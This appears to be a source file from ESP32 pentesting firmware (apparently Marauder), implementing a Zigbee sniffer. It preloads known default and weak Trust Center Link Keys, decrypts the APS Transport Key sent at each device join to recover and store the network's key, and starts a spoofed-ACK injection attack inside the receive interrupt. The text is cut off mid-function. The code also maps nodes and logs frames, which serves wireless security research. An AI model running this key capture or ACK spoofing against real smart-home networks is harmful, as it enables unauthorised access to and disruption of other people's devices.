#include "ZBScan.h"

// The entire implementation is gated on HAS_ZIGBEE. On targets without an
// 802.15.4 radio, ZBScan.h exposes no class at all (and WiFiScan does not
// inherit it), so no stub/no-op definitions are needed here.
#ifdef HAS_ZIGBEE

#ifdef HAS_SCREEN
  #include "Display.h"
  extern Display display_obj;
#endif

// AES-128-CCM* lives in mbedtls, which is part of the ESP32 Arduino / ESP-IDF
// framework and is therefore always available on the 802.15.4-capable targets
// this file compiles for. Used to decrypt the APS Transport Key command and to
// encrypt/decrypt NWK-layer ZDO frames (ZbPing).
#include "mbedtls/ccm.h"
extern "C" {
  #include "esp_random.h"   // HWRNG, to seed the NWK frame counter
}

// PSRAM helper: the Waveshare C5 has 8MB PSRAM (BOARD_HAS_PSRAM). Allocating
// the growing node/key list containers from PSRAM when present frees internal
// RAM and lets the node list grow far larger. Mirrors the ps_malloc placement-
// new idiom already used for `ssids` in WiFiScan.cpp.
template <typename T>
static LinkedList<T>* zbNewList() {
  #ifdef BOARD_HAS_PSRAM
    if (psramFound()) {
      void *mem = ps_malloc(sizeof(LinkedList<T>));
      if (mem) return new (mem) LinkedList<T>();
    }
  #endif
  return new LinkedList<T>();
}

// Global node list, defined here (declared extern in ZBScan.h), mirroring the
// way WiFiScan.cpp owns the global `access_points` list. Placed in PSRAM when
// available so the discovered-node capacity is bounded by PSRAM, not the small
// internal heap.
LinkedList<ZigbeeNode>* zigbee_nodes = zbNewList<ZigbeeNode>();

// Global captured/known-key list (TCLKs + recovered network keys).
LinkedList<ZbKey>* zigbee_keys = zbNewList<ZbKey>();

// -- Well-known Trust Center Link Keys, preloaded so a join can be decrypted --
// ZigBeeAlliance09 is the Zigbee 3.0 global default TCLK; eISY is a gateway-
// specific TCLK observed in the field. Ported from C6_zigbee.
static const uint8_t ZB_TCLK_ZIGBEE_ALLIANCE09[ZIGBEE_KEY_LEN] = {
  0x5A, 0x69, 0x67, 0x42, 0x65, 0x65, 0x41, 0x6C,
  0x6C, 0x69, 0x61, 0x6E, 0x63, 0x65, 0x30, 0x39
};
static const uint8_t ZB_TCLK_EISY[ZIGBEE_KEY_LEN] = {
  0x01, 0xA4, 0x10, 0x62, 0xBF, 0x9E, 0xAD, 0x7A,
  0x8F, 0xE7, 0x2A, 0xBD, 0xB6, 0xF8, 0x18, 0x83
};
// All-zeros and the zigbee2mqtt "sequential" test TCLK, both seen on
// misconfigured networks. Ported from C6_zigbee.
static const uint8_t ZB_TCLK_ZERO[ZIGBEE_KEY_LEN] = { 0 };
static const uint8_t ZB_TCLK_SEQ[ZIGBEE_KEY_LEN] = {
  0x01, 0x03, 0x05, 0x07, 0x09, 0x0B, 0x0D, 0x0F,
  0x00, 0x02, 0x04, 0x06, 0x08, 0x0A, 0x0C, 0x0D
};

#define ZB_APS_CMD_TRANSPORT_KEY   0x05
#define ZB_APS_KEY_TYPE_NWK        0x01

// ACK-attack state lives in the RX ISR, so it is static + volatile.
volatile bool     ZBScan::zb_ackAttackActive = false;
volatile uint16_t ZBScan::zb_ackAttackTarget = 0xFFFF;
volatile uint32_t ZBScan::zb_ackAttackCount  = 0;

ZBScan::ZBScan() {
  memset(this->zb_joins, 0, sizeof(this->zb_joins));
}

// ---------------------------------------------------------------------------
// Broadcast / reserved short address helper (mirrors C6_zigbee's is_bcast()).
// ---------------------------------------------------------------------------
static inline bool zb_is_bcast(uint16_t addr) {
  return (addr == 0xFFFF || addr == 0xFFFE || addr == 0xFFFB ||
          addr == 0xFFFC || addr == 0xFFFD);
}

// ---------------------------------------------------------------------------
// Node list helpers - available on every target, radio or not.
// ---------------------------------------------------------------------------
int ZBScan::zbFindNode(uint16_t short_addr) {
  if (zigbee_nodes == nullptr)
    return -1;
  for (int i = 0; i < zigbee_nodes->size(); i++) {
    if (zigbee_nodes->get(i).short_addr == short_addr)
      return i;
  }
  return -1;
}

size_t ZBScan::retainedZigbeeNodeCount() const {
  return zigbee_nodes == nullptr ? 0 : zigbee_nodes->size();
}

int ZBScan::clearZigbeeNodes() {
  if (zigbee_nodes == nullptr) {
    zigbee_nodes = new LinkedList<ZigbeeNode>();
    return 0;
  }
  int num = zigbee_nodes->size();
  for (int i = 0; i < num; i++) {
    ZigbeeNode node = zigbee_nodes->get(i);
    if (node.connections != nullptr) {
      delete node.connections;
      node.connections = nullptr;
    }
  }
  zigbee_nodes->clear();
  return num;
}

// ===========================================================================
// Network-key capture (ported from C6_zigbee ZbKeyCapture).
//
// During a device join the coordinator sends an APS Transport Key command
// carrying the network key, encrypted at the APS layer with the Trust Center
// Link Key (TCLK). We watch for the association response (to learn which
// device is joining), then decrypt the following Transport Key with each known
// TCLK and recover the network key. Some stacks send the Transport Key with no
// APS encryption (plaintext) - that path is handled too.
// ===========================================================================

size_t ZBScan::zigbeeKeyCount() const {
  return zigbee_keys == nullptr ? 0 : zigbee_keys->size();
}

int ZBScan::clearZigbeeKeys() {
  if (zigbee_keys == nullptr) {
    zigbee_keys = zbNewList<ZbKey>();
    return 0;
  }
  int num = zigbee_keys->size();
  zigbee_keys->clear();
  this->zb_keys_loaded = false;
  return num;
}

// Add a key if not already present (dedup on type + key bytes). Returns true
// when a new key was stored.
bool ZBScan::zbAddKey(ZbKeyType type, const uint8_t *key16,
                      uint8_t seqNum, const char *label) {
  if (zigbee_keys == nullptr) zigbee_keys = zbNewList<ZbKey>();

  for (int i = 0; i < zigbee_keys->size(); i++) {
    ZbKey existing = zigbee_keys->get(i);
    if (existing.type == type &&
        memcmp(existing.key, key16, ZIGBEE_KEY_LEN) == 0)
      return false;   // already have it
  }

  ZbKey k;
  k.type = type;
  memcpy(k.key, key16, ZIGBEE_KEY_LEN);
  k.seqNum = seqNum;
  k.capturedAt_ms = millis();
  memset(k.label, 0, sizeof(k.label));
  if (label) strncpy(k.label, label, sizeof(k.label) - 1);

  zigbee_keys->add(k);
  this->zb_keys_dirty = true;   // ask WiFiScan to persist to SD
  return true;
}

ZbKey *ZBScan::zbFindNetworkKey(uint8_t seqNum) {
  // LinkedList::get() returns by value, so hand back a pointer into a static
  // scratch copy (read-only use only).
  static ZbKey found;
  if (zigbee_keys == nullptr) return nullptr;
  for (int i = 0; i < zigbee_keys->size(); i++) {
    ZbKey k = zigbee_keys->get(i);
    if (k.type == ZB_KEY_NETWORK && k.seqNum == seqNum) {
      found = k;
      return &found;
    }
  }
  return nullptr;
}

// Most recently captured/added NETWORK key (used to encrypt outgoing ZDO
// frames). Returns a pointer into its own static scratch copy.
ZbKey *ZBScan::zbFindLatestNetworkKey() {
  static ZbKey latest;
  if (zigbee_keys == nullptr) return nullptr;
  bool found = false;
  uint32_t best = 0;
  for (int i = 0; i < zigbee_keys->size(); i++) {
    ZbKey k = zigbee_keys->get(i);
    if (k.type != ZB_KEY_NETWORK) continue;
    if (!found || k.capturedAt_ms >= best) { latest = k; best = k.capturedAt_ms; found = true; }
  }
  return found ? &latest : nullptr;
}

void ZBScan::zbLoadDefaultKeys() {
  if (this->zb_keys_loaded) return;
  this->zbAddKey(ZB_KEY_TCLK, ZB_TCLK_ZIGBEE_ALLIANCE09, 0, "ZigBeeAlliance09");
  this->zbAddKey(ZB_KEY_TCLK, ZB_TCLK_ZERO, 1, "Zero-TCLK");
  this->zbAddKey(ZB_KEY_TCLK, ZB_TCLK_SEQ,  2, "Seq-TCLK");
  this->zbAddKey(ZB_KEY_TCLK, ZB_TCLK_EISY, 3, "eISY-TCLK");
  // Default TCLKs are not "captured" - don't force an SD rewrite for them.
  this->zb_keys_dirty = false;
  this->zb_keys_loaded = true;
}

void ZBScan::zbPrintKey(const ZbKey &key) {
  const char *tn = (key.type == ZB_KEY_NETWORK) ? "NWK"
                 : (key.type == ZB_KEY_TCLK)    ? "TCLK" : "APP";
  char hex[ZIGBEE_KEY_LEN * 3 + 1];
  int p = 0;
  for (int i = 0; i < ZIGBEE_KEY_LEN; i++)
    p += snprintf(hex + p, sizeof(hex) - p, "%02X%s",
                  key.key[i], i < ZIGBEE_KEY_LEN - 1 ? ":" : "");
  Serial.printf("[ZBKEY] %s seq=%u %s %s\n", tn, key.seqNum, hex, key.label);
  #ifdef HAS_SCREEN
    String line = String("[KEY] ") + tn + " s" + key.seqNum + " " + hex;
    if (display_obj.display_buffer != nullptr)
      display_obj.display_buffer->add(line);
  #endif
}

// -- Pending-join tracking ----------------------------------------------------

ZbJoinState *ZBScan::zbFindJoin(uint16_t addr) {
  for (int i = 0; i < ZB_MAX_PENDING_JOINS; i++)
    if (this->zb_joins[i].active && this->zb_joins[i].shortAddr == addr)
      return &this->zb_joins[i];
  return nullptr;
}

ZbJoinState *ZBScan::zbAllocJoin(uint16_t addr) {
  for (int i = 0; i < ZB_MAX_PENDING_JOINS; i++) {
    if (!this->zb_joins[i].active) {
      this->zb_joins[i].active       = true;
      this->zb_joins[i].shortAddr    = addr;
      this->zb_joins[i].extAddr      = 0;
      this->zb_joins[i].assocTime_ms = millis();
      return &this->zb_joins[i];
    }
  }
  // All slots busy - reuse the oldest.
  ZbJoinState *oldest = &this->zb_joins[0];
  for (int i = 1; i < ZB_MAX_PENDING_JOINS; i++)
    if (this->zb_joins[i].assocTime_ms < oldest->assocTime_ms)
      oldest = &this->zb_joins[i];
  oldest->active       = true;
  oldest->shortAddr    = addr;
  oldest->extAddr      = 0;
  oldest->assocTime_ms = millis();
  return oldest;
}

void ZBScan::zbFreeJoin(ZbJoinState *j) {
  if (j) j->active = false;
}

void ZBScan::zbExpireJoins(uint32_t timeout_ms) {
  uint32_t now = millis();
  for (int i = 0; i < ZB_MAX_PENDING_JOINS; i++)
    if (this->zb_joins[i].active &&
        (now - this->zb_joins[i].assocTime_ms) > timeout_ms)
      this->zb_joins[i].active = false;
}

// -- Entry point: feed one decoded frame through the capture pipeline ---------

void ZBScan::zbKeyCaptureFrame(const ZbFrameInfo &info, const uint8_t *raw,
                               uint8_t rawLen, uint8_t macOff) {
  if (!this->zb_key_capture) return;

  // Learn the coordinator's EUI64 whenever it appears as an extended source
  // from short address 0x0000.
  if (info.srcExtended != 0 && info.macSrc == 0x0000)
    this->zb_coordEUI64 = info.srcExtended;

  // Association response (MAC command 0x02) tells us a device is joining.
  if (info.frameType == ZB_FC_FRAME_TYPE_MACCMD) {
    uint8_t cmdId = (macOff < rawLen) ? raw[macOff] : 0xFF;
    if (cmdId == 0x02)
      this->zbHandleAssocResponse(info);
    return;
  }

  // Unicast Zigbee data frame -> candidate APS Transport Key.
  if (info.isZigbee && info.frameType == ZB_FC_FRAME_TYPE_DATA) {
    if (!zb_is_bcast(info.nwkDst) && macOff < rawLen)
      this->zbHandleTransportKey(info, raw + macOff, rawLen - macOff);
  }
}

void ZBScan::zbHandleAssocResponse(const ZbFrameInfo &info) {
  // Must come from the coordinator (directly, or relayed by a router whose NWK
  // source is the coordinator).
  if (info.macSrc != 0x0000 && info.nwkSrc != 0x0000) return;

  uint16_t newDevAddr = info.macDst;   // may be 0xFFFE for an ext-addressed resp

  // If we already track this EUI64 (from an earlier assoc req/beacon), just
  // refresh its short address instead of allocating a new slot.
  if (info.dstExtended != 0) {
    for (int i = 0; i < ZB_MAX_PENDING_JOINS; i++) {
      if (this->zb_joins[i].active &&
          this->zb_joins[i].extAddr == info.dstExtended) {
        this->zb_joins[i].shortAddr = newDevAddr;
        return;
      }
    }
  }

  ZbJoinState *j = this->zbAllocJoin(newDevAddr);
  j->extAddr = info.dstExtended;
  Serial.printf("[ZBKEY] Join detected: 0x%04X (EUI64 %016llX)\n",
                newDevAddr, (unsigned long long)info.dstExtended);
}

bool ZBScan::zbHandleTransportKey(const ZbFrameInfo &info,
                                  const uint8_t *nwkPayload, uint8_t nwkLen) {
  // Match to a recently-joined device by NWK dst; fall back to any active join
  // if the frame came from the coordinator (indirect routing via a parent).
  ZbJoinState *j = this->zbFindJoin(info.nwkDst);
  if (!j && info.nwkSrc == 0x0000) {
    for (int i = 0; i < ZB_MAX_PENDING_JOINS; i++)
      if (this->zb_joins[i].active) { j = &this->zb_joins[i]; break; }
  }
  if (!j) return false;

  uint8_t apsOffset = 0;
  if (!this->zbSkipNwkHeader(nwkPayload, nwkLen, apsOffset)) return false;
  if (apsOffset >= nwkLen) return false;

  uint8_t apsFc        = nwkPayload[apsOffset];
  uint8_t apsFrameType = apsFc & 0x03;
  bool    apsSecured   = (apsFc >> 5) & 0x01;

  if (apsFrameType != 0x01) return false;   // not an APS command frame

  // Coordinator EUI64 for the CCM* nonce (fallback: node 0x0000's ext addr).
  uint64_t coordEUI64 = this->zb_coordEUI64;
  if (coordEUI64 == 0) {
    int ci = this->zbFindNode(0x0000);
    if (ci >= 0) coordEUI64 = zigbee_nodes->get(ci).ext_addr;
  }

  if (apsSecured) {
    // APS-encrypted: try every known TCLK.
    for (int ki = 0; ki < zigbee_keys->size(); ki++) {
      ZbKey k = zigbee_keys->get(ki);
      if (k.type != ZB_KEY_TCLK) continue;

      uint8_t plaintext[96] = {};
      uint8_t plaintextLen  = 0;
      if (!this->zbDecryptApsPayload(nwkPayload, nwkLen, apsOffset,
                                     k.key, coordEUI64,
                                     plaintext, plaintextLen))
        continue;

      uint8_t networkKey[ZIGBEE_KEY_LEN] = {};
      uint8_t keySeq = 0;
      if (!this->zbParseTransportKey(plaintext, plaintextLen, networkKey, keySeq)) {
        // zbParseTransportKey expects the buffer to start at the APS FC byte,
        // which holds for the MIC-only / plaintext case (zbDecryptApsPayload
        // copies from the APS FC). For a truly ENCRYPTED payload, however, the
        // CCM* output is the bare APS command payload - command id(1) +
        // keyType(1) + key(16) + seq(1) + ... - so parse that layout directly.
        if (!(plaintextLen >= 19 &&
              plaintext[0] == ZB_APS_CMD_TRANSPORT_KEY &&
              plaintext[1] == ZB_APS_KEY_TYPE_NWK))
          continue;
        memcpy(networkKey, &plaintext[2], ZIGBEE_KEY_LEN);
        keySeq = plaintext[2 + ZIGBEE_KEY_LEN];
      }

      char label[20];
      snprintf(label, sizeof(label), "NWK-seq%u", keySeq);
      if (this->zbAddKey(ZB_KEY_NETWORK, networkKey, keySeq, label)) {
        ZbKey disp; disp.type = ZB_KEY_NETWORK;
        memcpy(disp.key, networkKey, ZIGBEE_KEY_LEN);
        disp.seqNum = keySeq; strncpy(disp.label, label, sizeof(disp.label));
        Serial.println(F("[ZBKEY] *** Network key captured! ***"));
        this->zbPrintKey(disp);
      }
      this->zbFreeJoin(j);
      return true;
    }
    if (this->zb_verbose)
      Serial.printf("[ZBKEY] Decrypt failed for 0x%04X\n", info.nwkDst);
    return false;
  }

  // APS not encrypted: parse the plaintext Transport Key directly.
  uint8_t networkKey[ZIGBEE_KEY_LEN] = {};
  uint8_t keySeq = 0;
  if (!this->zbParseTransportKey(&nwkPayload[apsOffset], nwkLen - apsOffset,
                                 networkKey, keySeq))
    return false;

  char label[20];
  snprintf(label, sizeof(label), "NWK-seq%u", keySeq);
  if (this->zbAddKey(ZB_KEY_NETWORK, networkKey, keySeq, label)) {
    ZbKey disp; disp.type = ZB_KEY_NETWORK;
    memcpy(disp.key, networkKey, ZIGBEE_KEY_LEN);
    disp.seqNum = keySeq; strncpy(disp.label, label, sizeof(disp.label));
    Serial.println(F("[ZBKEY] *** Network key captured (plaintext)! ***"));
    this->zbPrintKey(disp);
  }
  this->zbFreeJoin(j);
  return true;
}

// Skip the NWK header (incl. optional multicast/ext-addr/source-route/AUX) to
// reach the APS layer. Returns the APS offset in `apsOffset`.
bool ZBScan::zbSkipNwkHeader(const uint8_t *p, uint8_t len, uint8_t &apsOffset) {
  if (len < 8) return false;

  uint16_t nwkFc = (uint16_t)p[0] | ((uint16_t)p[1] << 8);
  uint8_t off = 8;                            // FC(2)+dst(2)+src(2)+radius(1)+seq(1)

  if ((nwkFc >> 8) & 0x01) { if (off + 1 > len) return false; off++; }        // multicast ctrl
  if (nwkFc & ZB_NWK_FC_EXT_DST) { if (off + 8 > len) return false; off += 8; }
  if (nwkFc & ZB_NWK_FC_EXT_SRC) { if (off + 8 > len) return false; off += 8; }
  if (nwkFc & ZB_NWK_FC_SOURCE_ROUTE) {
    if (off + 2 > len) return false;
    uint8_t relayCount = p[off];
    off += 2 + relayCount * 2;
    if (off > len) return false;
  }

  // NWK AUX security header (bit9 of FC) - skip it to reach the APS layer.
  if (nwkFc & ZB_NWK_FC_SECURITY) {
    if (off + 6 > len) return false;          // secCtrl(1)+fc(4)+keySeq(1)
    uint8_t auxSecCtrl = p[off];
    bool hasExtSrc = (auxSecCtrl >> 5) & 0x01; // bit5 = Extended Nonce
    off += 6;
    if (hasExtSrc) { if (off + 8 > len) return false; off += 8; }
  }

  apsOffset = off;
  return true;
}

// Decrypt the APS Transport Key payload with CCM* using `key` (a TCLK). Handles
// both the encrypted (secLevel>=4) and plaintext-within-APS cases.
bool ZBScan::zbDecryptApsPayload(const uint8_t *nwkPayload, uint8_t nwkLen,
                                 uint8_t apsOffset, const uint8_t *key,
                                 uint64_t knownExtSrc,
                                 uint8_t *plaintextOut, uint8_t &plaintextLen) {
  if (apsOffset + 1 + 6 + 4 >= nwkLen) return false;

  uint8_t auxStart   = apsOffset + 1;         // AUX begins after APS FC
  const uint8_t *aux = &nwkPayload[auxStart];
  uint8_t remaining  = nwkLen - auxStart;
  if (remaining < 6) return false;

  uint8_t  secCtrl  = aux[0];
  uint8_t  secLevel = secCtrl & 0x07;
  bool     hasExtSrc = (secCtrl >> 5) & 0x01; // bit5 = Extended Nonce

  // MIC length depends on secLevel&0x03: 0/4/8/16 bytes.
  uint8_t micLen;
  switch (secLevel & 0x03) {
    case 0:  micLen = 0;  break;
    case 1:  micLen = 4;  break;
    case 2:  micLen = 8;  break;
    default: micLen = 16; break;
  }

  uint8_t auxOff = 5;                          // past secCtrl(1) + frameCounter(4)
  uint8_t srcEui64[8] = {};
  if (hasExtSrc) {
    if (auxOff + 8 > remaining) return false;
    memcpy(srcEui64, &aux[auxOff], 8);
    auxOff += 8;
  } else {
    memcpy(srcEui64, &knownExtSrc, 8);         // coordinator EUI64 (LE in memory)
  }
  if (auxOff + 1 > remaining) return false;
  auxOff++;                                    // skip keySeq

  uint8_t encStart = auxStart + auxOff;
  if (encStart + micLen >= nwkLen) return false;
  uint8_t encLen = nwkLen - encStart - micLen;

  // secLevel without the ENC bit (0x04) => payload is plaintext; copy from the
  // APS FC byte so zbParseTransportKey sees FC + AUX + command.
  if ((secLevel & 0x04) == 0) {
    uint8_t payloadLen = nwkLen - apsOffset - micLen;
    if (payloadLen == 0 || payloadLen > 95) return false;
    memcpy(plaintextOut, &nwkPayload[apsOffset], payloadLen);
    plaintextLen = payloadLen;
    return true;
  }

  const uint8_t *ciphertext = &nwkPayload[encStart];
  const uint8_t *mic        = &nwkPayload[nwkLen - micLen];

  // CCM* nonce: srcEUI64(8,LE) | frameCounter(4,LE) | secCtrl(1).
  uint8_t nonce[13];
  memcpy(nonce,     srcEui64, 8);
  memcpy(nonce + 8, &aux[1],  4);
  nonce[12] = secCtrl;

  // AAD: NWK payload from offset 0 up to (not including) the ciphertext.
  const uint8_t *aad    = nwkPayload;
  uint8_t        aadLen = encStart;

  if (encLen == 0 || encLen > 95) return false;

  bool ok = this->zbCcmDecrypt(key, nonce, aad, aadLen,
                               ciphertext, encLen, plaintextOut, mic, micLen);
  if (ok) plaintextLen = encLen;
  return ok;
}

bool ZBScan::zbCcmDecrypt(const uint8_t *key, const uint8_t *nonce,
                          const uint8_t *aad, uint8_t aadLen,
                          const uint8_t *ct, uint8_t ctLen,
                          uint8_t *pt, const uint8_t *mic, uint8_t micLen) {
  mbedtls_ccm_context ctx;
  mbedtls_ccm_init(&ctx);
  int ret = mbedtls_ccm_setkey(&ctx, MBEDTLS_CIPHER_ID_AES, key, 128);
  if (ret != 0) { mbedtls_ccm_free(&ctx); return false; }
  ret = mbedtls_ccm_star_auth_decrypt(&ctx, ctLen, nonce, 13,
                                      aad, aadLen, ct, pt, mic, micLen);
  mbedtls_ccm_free(&ctx);
  return (ret == 0);
}

// Parse an APS Transport Key command. aps[0] = APS FC byte.
bool ZBScan::zbParseTransportKey(const uint8_t *aps, uint8_t apsLen,
                                 uint8_t *networkKeyOut, uint8_t &seqNumOut) {
  if (apsLen < 2) return false;

  uint8_t apsFc        = aps[0];
  uint8_t apsFrameType = apsFc & 0x03;
  bool    apsSecured   = (apsFc >> 5) & 0x01;
  if (apsFrameType != 0x01) return false;

  uint8_t cmdOff = 1;                          // command id follows APS FC
  if (apsSecured) {
    if (apsLen < 8) return false;
    uint8_t auxSecCtrl = aps[1];
    bool    hasExtSrc  = (auxSecCtrl >> 6) & 0x01;
    uint8_t auxLen     = 6;
    if (hasExtSrc) auxLen += 8;
    cmdOff = 1 + auxLen;
  }
  if (cmdOff + 1 >= apsLen) return false;

  if (aps[cmdOff] != ZB_APS_CMD_TRANSPORT_KEY) return false;

  // Transport Key payload: cmd(1)+keyType(1)+key(16)+seq(1)+dstEUI(8)+srcEUI(8).
  uint8_t payOff = cmdOff + 1;
  if (payOff + 35 > apsLen) return false;
  if (aps[payOff] != ZB_APS_KEY_TYPE_NWK) return false;

  memcpy(networkKeyOut, &aps[payOff + 1], ZIGBEE_KEY_LEN);
  seqNumOut = aps[payOff + 1 + ZIGBEE_KEY_LEN];
  return true;
}

// Add a node if new, otherwise refresh it. For source frames, record the link
// to the destination short address (the "connection"). Ported from
// IEEE802154Sniffer::_updateHost(), reduced to the fields Marauder tracks.
ZigbeeNode* ZBScan::zbUpdateNode(const ZbFrameInfo &info, uint16_t addr, bool is_src) {
  if (zb_is_bcast(addr))
    return nullptr;
  if (zigbee_nodes == nullptr)
    zigbee_nodes = new LinkedList<ZigbeeNode>();

  uint32_t now = millis();
  int idx = zbFindNode(addr);

  ZigbeeNode node;
  if (idx < 0) {
    node.short_addr    = addr;
    node.pan_id        = info.panId;
    node.ext_addr      = 0;
    node.rssi          = info.rssi;
    node.lqi           = info.lqi;
    node.channel       = info.channel;
    node.device_type   = (addr == 0x0000) ? ZB_DEV_COORDINATOR : ZB_DEV_UNKNOWN;
    node.selected      = false;
    node.beacon_seen   = false;
    node.assoc_permit  = false;
    node.packets       = 0;
    node.first_seen_ms = now;
    node.last_seen_ms  = now;
    node.connections   = new LinkedList<uint16_t>();
  } else {
    node = zigbee_nodes->get(idx);
  }

  // Learn the extended (MAC) address when it shows up.
  if (addr == info.macSrc && info.srcExtended != 0 && node.ext_addr == 0)
    node.ext_addr = info.srcExtended;
  if (addr == info.macDst && info.dstExtended != 0 && node.ext_addr == 0)
    node.ext_addr = info.dstExtended;

  node.rssi         = info.rssi;
  node.lqi          = info.lqi;
  node.channel      = info.channel;
  node.last_seen_ms = now;
  if (node.packets < 0xFFFF)
    node.packets++;

  // Record a connection from this source node to the destination it talked to.
  if (is_src && !zb_is_bcast(info.macDst) && info.macDst != 0) {
    bool present = false;
    for (int j = 0; j < node.connections->size(); j++) {
      if (node.connections->get(j) == info.macDst) {
        present = true;
        break;
      }
    }
    if (!present)
      node.connections->add(info.macDst);
  }

  // Beacon senders are coordinators or routers.
  if (info.beaconSeen && is_src) {
    node.beacon_seen  = true;
    node.assoc_permit = info.beaconAssocPermit;
    if (node.device_type == ZB_DEV_UNKNOWN)
      node.device_type = ZB_DEV_ROUTER;
  }

  if (idx < 0)
    zigbee_nodes->add(node);
  else
    zigbee_nodes->set(idx, node);

  return nullptr;
}

// Fold one decoded frame into the node list + connections.
void ZBScan::zbProcessFrame(const ZbFrameInfo &info) {
  this->zbUpdateNode(info, info.macSrc, true);
  this->zbUpdateNode(info, info.macDst, false);

  if (info.hasNwk) {
    this->zbUpdateNode(info, info.nwkSrc, true);
    this->zbUpdateNode(info, info.nwkDst, false);
  }
}

// ---------------------------------------------------------------------------
// Human-readable frame naming + per-frame logging (always compiled; only
// called on 802.15.4-capable targets).
// ---------------------------------------------------------------------------
const char *ZBScan::zbFrameTypeName(uint8_t frameType) {
  switch (frameType) {
    case ZB_FC_FRAME_TYPE_BEACON: return "Beacon";
    case ZB_FC_FRAME_TYPE_DATA:   return "Data";
    case ZB_FC_FRAME_TYPE_ACK:    return "Ack";
    case ZB_FC_FRAME_TYPE_MACCMD: return "MAC-Cmd";
    default:                      return "802.15.4";
  }
}

const char *ZBScan::zbMacCmdName(uint8_t cmd) {
  switch (cmd) {
    case 0x01: return "Assoc-Req";
    case 0x02: return "Assoc-Resp";
    case 0x03: return "Disassoc";
    case 0x04: return "Data-Req";
    case 0x05: return "PANID-Conflict";
    case 0x06: return "Orphan";
    case 0x07: return "Beacon-Req";
    case 0x08: return "Coord-Realign";
    case 0x09: return "GTS-Req";
    default:   return "MAC-Cmd";
  }
}

const char *ZBScan::zbNwkCmdName(uint8_t cmd) {
  switch (cmd) {
    case 0x01: return "Route-Req";
    case 0x02: return "Route-Reply";
    case 0x03: return "NWK-Status";
    case 0x04: return "Leave";
    case 0x05: return "Route-Record";
    case 0x06: return "Rejoin-Req";
    case 0x07: return "Rejoin-Resp";
    case 0x08: return "Link-Status";
    case 0x09: return "NWK-Report";
    case 0x0A: return "NWK-Update";
    default:   return "NWK-Cmd";
  }
}

void ZBScan::zbPrintFrame(const ZbFrameInfo &info) {
  // Source address (short, or low 16 bits of extended if short is unknown).
  char src[20];
  if (info.macSrc != 0xFFFE && info.macSrc != 0xFFFF)
    snprintf(src, sizeof(src), "0x%04X", info.macSrc);
  else if (info.srcExtended)
    snprintf(src, sizeof(src), "%08X%08X",
             (uint32_t)(info.srcExtended >> 32), (uint32_t)info.srcExtended);
  else
    snprintf(src, sizeof(src), "----");

  // Destination address or broadcast label.
  char dst[20];
  if (zb_is_bcast(info.macDst))
    snprintf(dst, sizeof(dst), "BCAST");
  else if (info.macDst != 0xFFFE && info.macDst != 0xFFFF)
    snprintf(dst, sizeof(dst), "0x%04X", info.macDst);
  else if (info.dstExtended)
    snprintf(dst, sizeof(dst), "%08X%08X",
             (uint32_t)(info.dstExtended >> 32), (uint32_t)info.dstExtended);
  else
    snprintf(dst, sizeof(dst), "----");

  // A function label: NWK/MAC command name, beacon state, or plain type.
  const char *func = zbFrameTypeName(info.frameType);
  if (info.frameType == ZB_FC_FRAME_TYPE_MACCMD)
    func = zbMacCmdName(info.macCmd);
  else if (info.frameType == ZB_FC_FRAME_TYPE_BEACON)
    func = info.beaconAssocPermit ? "Beacon(JoinOK)" : "Beacon(Closed)";
  else if (info.isZigbee && info.zbNwkType == ZB_NWK_TYPE_CMD && info.zbNwkCmd)
    func = zbNwkCmdName(info.zbNwkCmd);

  Serial.printf("[ZB] ch%u %ddBm PAN:0x%04X %-14s %s->%s%s%s\n",
                info.channel, info.rssi, info.panId, func, src, dst,
                info.isZigbee ? " ZB" : "",
                (info.macSecurityEnabled || info.zbNwkSecurity) ? " ENC" : "");

  #ifdef HAS_SCREEN
    //if (zb_is_bcast(info.macDst))
    //  display_obj.tft.setTextColor(TFT_CYAN, TFT_BLACK);
    String line = "c" + String(info.channel) + " " + String(info.rssi) + " " +
                  String(func) + " " + String(src) + ">" + String(dst);
    display_obj.display_buffer->add(line);
  #endif
}

// Redraw the single-line status strip at the top of the Zigbee sniff screen.
// Uses the exact rect/font the scan title uses (see WiFiScan::StartScan's
// ZIGBEE_SCAN_ALL branch) so it overwrites the title cleanly and keeps the
// current channel + hop state visible - including while the band is hopping.
void ZBScan::zbDrawStatusLabel() {
  #ifdef HAS_SCREEN
    display_obj.tft.fillRect(0, 16, TFT_WIDTH, 16, this->zb_color);
    display_obj.tft.setTextColor(TFT_BLACK, this->zb_color);
    String label = this->zb_channel_hop
                     ? (String("Zigbee HOP  CH ") + this->zb_channel)
                     : (String("Zigbee LOCK CH ") + this->zb_channel);
    display_obj.tft.drawCentreString(label, TFT_WIDTH / 2, 16, 2);
  #endif
}

// ---------------------------------------------------------------------------
// 802.15.4 radio plumbing (ESP32-C5 / ESP32-C6 / ESP32-H2 only).
// Ported from C6_zigbee IEEE802154Sniffer (init/start/stop/rxCallback).
// ---------------------------------------------------------------------------
QueueHandle_t ZBScan::zb_rx_queue = nullptr;

// The ESP-IDF 802.15.4 driver calls these C hooks. Route the receive-done hook
// into ZBScan::rxCallback, then hand the buffer back to the driver.
extern "C" void esp_ieee802154_receive_done(uint8_t *frame,
                                             esp_ieee802154_frame_info_t *fi) {
  ZBScan::rxCallback(frame, fi);
  esp_ieee802154_receive_handle_done(frame);
}
extern "C" void esp_ieee802154_receive_failed(uint16_t error) { (void)error; }
extern "C" void esp_ieee802154_receive_sfd_done(void) {}
extern "C" void esp_ieee802154_transmit_done(const uint8_t *frame,
                                             const uint8_t *ack,
                                             esp_ieee802154_frame_info_t *fi) {
  (void)frame; (void)ack; (void)fi;
}
extern "C" void esp_ieee802154_transmit_failed(const uint8_t *frame,
                                               esp_ieee802154_tx_error_t err) {
  (void)frame; (void)err;
}

// RX ISR context: copy the frame into the queue for the main loop to decode.
void ZBScan::rxCallback(uint8_t *frame, esp_ieee802154_frame_info_t *fi) {
  if (!zb_rx_queue || !frame)
    return;
  uint8_t len = frame[0];               // PHR length byte
  if (len < 3 || len > ZIGBEE_MAX_FRAME_LEN)
    return;

  // --- ACK-attack fast path (ZigDiggity "ack_attack") --------------------
  // Runs in the receive-done ISR/driver context so we can inject a spoofed
  // MAC ACK before the real target's radio does. If this frame is a data
  // frame addressed (short) to the attack target and requests an ACK, send a
  // bare ACK with the matching sequence number immediately. Best-effort:
  // winning the ~192us ACK window depends on RF geometry and driver
  // turnaround, and transmit() from this context is not a documented-safe
  // reentrancy point (first suspect if the radio wedges under sustained use).
  // frame layout: [len][FC_lo][FC_hi][seq][dstPAN_lo][dstPAN_hi][dst_lo][dst_hi]...
  if (zb_ackAttackActive && len >= 9) {
    uint8_t fcLow   = frame[1];
    uint8_t fcHigh  = frame[2];
